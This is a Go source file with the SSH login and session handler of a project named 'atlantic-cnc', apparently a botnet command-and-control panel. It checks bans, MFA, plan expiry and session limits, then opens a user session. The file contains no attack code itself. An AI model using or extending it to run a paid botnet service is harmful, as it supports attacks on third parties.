package masters

import (
	"log"
	"time"
	
	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/sessions/sessions"
	"atlantic-cnc/core/models/json/build"
	"atlantic-cnc/core/sessions/views"

	"golang.org/x/crypto/ssh"
)


func NewConnection(conn *ssh.ServerConn, channel ssh.Channel) {
	
	User, error := database.GetUser(conn.User())
	if error != nil || User == nil {
		channel.Write([]byte("\033[2J\033[;H"+build.Config.AppConfig.AppName+" is currently experiencing issues right now"))
		log.Println(error)
		time.Sleep(10 * time.Second)
		channel.Close()
		return
	}

	if User.Banned {
		views.LoginBanned(channel, conn, User)
		return
	}


	if User.NewAccount {
		error := views.Login_NewUser(channel, conn, User)
		if error != nil {
			return
		}
	}

        if User.MFAnew && User.NewAccount == false {
		error := views.CreateMFA(channel, conn)
		if error != nil {
			return
		}
        }

        if len(User.MFA) > 1 {
		error := views.MFARequire(channel, conn, User)
		if error != nil {
			return
		}
        }

	if User.PlanExpiry <= time.Now().Unix() {
		error := views.Login_Expired(channel, conn, User)
		if error != nil {
			channel.Close()
			return
		}

		channel.Close()
		return
	}



	if sessions.UserSessions(User.Username) >= User.MaxSessions {
		error := views.MaxSessionsReached(channel, conn, User)
		if error != nil {
			channel.Close()
			return
		}

		return
	}

	var New = sessions.Session_Store {
		User: User,

		Channel: channel,

		Conn: conn,

		Chat: false,

		Creation: time.Now(),

		CurrentTheme: nil,
	}

	created := sessions.Create(&New)
	if !created {
		error := views.Sessions_launch_403(channel, conn, User)
		if error != nil {
			return
		}

		return
	}

	go sessions.Auto_Remove(&New)

	
	views.Home_Splash(channel, conn, User, &New)
}
